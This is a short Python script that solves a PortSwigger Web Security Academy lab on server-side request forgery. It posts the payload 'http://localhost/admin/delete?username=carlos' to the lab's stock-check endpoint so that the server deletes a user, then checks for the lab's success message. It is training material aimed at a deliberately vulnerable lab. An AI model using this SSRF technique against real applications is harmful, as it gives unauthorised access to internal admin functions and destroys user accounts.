import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
# author: 0xyf


class SSRF1:
    def __init__(self):
        self.lab_id = "0ab100580385d27080c236c6000f0041"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"

    def ssrf(self):
        payload = "http://localhost/admin/delete?username=carlos"
        data = {"stockApi": payload}
        print(f"[+] payload: {payload}")
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.ssrf()
        self.check_solved()


def main():
    SSRF1().solve()


if __name__ == "__main__":
    main()
